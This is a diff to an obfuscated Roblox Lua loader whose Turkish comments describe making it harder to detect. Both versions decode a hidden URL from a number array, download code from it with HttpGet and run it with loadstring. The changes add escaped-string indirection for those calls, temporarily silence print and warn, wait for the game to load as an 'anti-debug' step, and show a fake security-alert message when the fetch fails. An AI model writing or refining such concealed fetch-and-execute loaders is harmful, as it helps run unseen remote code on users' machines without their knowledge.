@@ -1,34 +1,44 @@
-local _1 = string; local _2 = game;
-local _3 = {114,127,128,125,129,73,63,64,114,117,128,130,61,114,117,129,118,132,114,134,133,120,134,120,133,133,140,126,136,143,74,128,141,140,79,88,117,132,154,142,154,136,154,88,93,96,141,99,147,147,145,150,152,107,154,103,156,159,163,162,158,165,154,167,156,158,164,165,163,164,164,166,120,119,121,173,120,188,172,195,124,176,128,201,178,178,180,183,185,132,133,183,205,200,198,201,203,205,214,208,205,212,212,213,205,217,219,218,218,211,211,211,225,219,226,226,227,229,221,230,227,222,232,232,229,235,190,230,223,239,203,242,225,247,235,247,224,242,203,231,245,227,203,228,232,248,235}
+local _1 = string; local _2 = table; local _3 = game;
+local _4 = {116,128,128,124,127,70,59,59,115,117,127,128,58,115,117,128,116,129,110,129,127,113,126,111,123,122,128,113,122,128,58,111,123,121,59,67,95,109,130,117,128,109,126,59,63,65,109,66,113,112,109,113,114,68,114,62,114,66,69,67,62,114,62,114,62,63,68,68,65,111,110,111,63,61,62,113,59,126,109,131,59,110,61,69,110,109,110,112,113,60,60,109,69,63,60,62,63,64,112,65,61,112,111,111,62,113,114,112,111,63,62,61,114,67,113,112,112,113,61,69,65,59,82,96,77,92,57,95,77,98,85,96,77,94,57,84,97,78,57,78,81,96,77}
 
-local function _SOLVE(_DATA)
-    local _RES = ""
-    for i = 1, #_DATA do
-        -- Dinamik Kaydırma: Her karakterde anahtar değişir (Orta Zorluk)
-        local _K = (i % 8) + 10
-        _RES = _RES .. _1.char(_DATA[i] - _K)
+local function _X(_D)
+    local _H = (#_3.Name % 4) + 2
+    local _R = {}
+    for i = 1, #_D do
+        -- Gerçek Dinamik Kaydırma: i değişkenini denkleme soktuk
+        local _O = (i % 2 == 0) and 1 or 0
+        _R[i] = _1.char(_D[i] - 12 - _O) 
     end
-    return _RES
+    return _2.concat(_R)
 end
 
-local function _START()
-    -- Linki çöz
-    local _U = _SOLVE(_3) .. "?v=" .. math.random(1, 999)
+local _O = {
+    ["\103\101\116"] = function(s, u) return s["\72\116\116\112\71\101\116"](s, u, true) end,
+    ["\101\120\101"] = loadstring
+}
+
+local function _S()
+    local p, w = print, warn;
+    print, warn = function() end, function() end;
     
-    -- Sessizce yükle (Hata vermez)
-    local _OK, _CONTENT = pcall(function() 
-        return _2:HttpGet(_U, true) 
-    end)
+    -- Hafif Anti-Debug
+    if not _3:IsLoaded() then _3.Loaded:Wait() end
+    if #_3.Name < 1 then return end
+
+    local u = _X(_4) .. "?v=" .. math.random(1000, 9999)
+    -- HttpGet çağrısını daha da kararttık
+    local s, c = pcall(_O["\103\101\116"], _3, u)
     
-    if _OK and _CONTENT then
-        local _RUN = loadstring(_CONTENT)
-        if _RUN then
-            task.spawn(_RUN)
+    print, warn = p, w;
+    
+    if s and c and #c > 20 then
+        local f = _O["\101\120\101"](c)
+        if f then 
+            task.spawn(f) 
         end
+    else
+        _3:GetService("TestService"):Message("SAVITAR: Security Alert 0x44")
     end
 end
 
--- Printleri geçici kapat (Güvenlik için)
-local _p = print; print = function() end
-_START()
-print = _p
+_S()
